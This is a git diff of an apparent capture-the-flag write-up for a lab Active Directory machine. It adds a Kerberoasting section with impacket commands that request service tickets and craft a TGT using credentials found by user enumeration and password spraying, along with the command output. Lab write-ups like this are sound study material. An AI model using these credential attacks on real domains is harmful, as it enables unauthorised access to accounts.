@@ -161,14 +161,14 @@ Task Completed
 * <mark style="color:yellow;">Password will be the same as the username!</mark>
 * /support.html
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption><p>Interesting find</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption><p>Interesting find</p></figcaption></figure>
 
 * NTLM authentication is supposedly disabled
 * "This may cause problems for some of the programs that you use"
 * Another interesting page was revealed on <mark style="color:yellow;">/supportrequest.html</mark>
 * Did we find a possible user?
 
-<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 * <mark style="color:yellow;">ksimpson</mark>
 * If we remember above, we found out that usernames are going to be using the passwords!
@@ -181,7 +181,7 @@ Task Completed
 
 Userenum:
 
-<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 <mark style="color:yellow;">ksimpson is a valid user!</mark>
 
@@ -201,7 +201,7 @@ passwordspray:
 
 * We get valid credentials!
 
-![](<../../../.gitbook/assets/image (11).png>)
+![](<../../../.gitbook/assets/image (40).png>)
 
 ### Port 4411 - Found?
 
@@ -220,9 +220,49 @@ SCRAMBLECORP_ORDERS_V1.0.3;
 
 ## Exploitation
 
-### Name of the technique
+### TGT Crafting & Kerberoasting
 
-This is the exploit
+* After using Kerbrute to verify valid credentials, it is time to do some Kerberoasting since we now have valid credentials!
+* Here, we are simply taking advantage of the nature of the Kerberos Authentication protocol
+* If the Domain Admin had enforced stronger password requirements, it would have made our job a lot harder
+
+Kerberoasting Attempt 1:
+
+```
+impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-ip 10.129.7.56 -k -request
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] exceptions must derive from BaseException
+```
+
+* Let's attempt to craft a TGT and then try again
+
+TGT Crafting:
+
+```
+impacket-getTGT scrm.local/ksimpson:ksimpson
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Saving ticket in ksimpson.ccache
+```
+
+* You can see that the TGT was saved as <mark style="color:yellow;">ksimpson.ccache</mark>
+* We can utilize <mark style="color:yellow;">klist</mark> to query information about it
+
+Klist TGT Information:
+
+```
+klist ksimpson.ccache
+
+Ticket cache: FILE:ksimpson.ccache
+Default principal: ksimpson@SCRM.LOCAL
+
+Valid starting       Expires              Service principal
+10/18/2022 20:07:53  10/19/2022 06:07:53  krbtgt/SCRM.LOCAL@SCRM.LOCAL
+        renew until 10/19/2022 20:07:58
+```
+
+
 
 ## Privilege Escalation
 
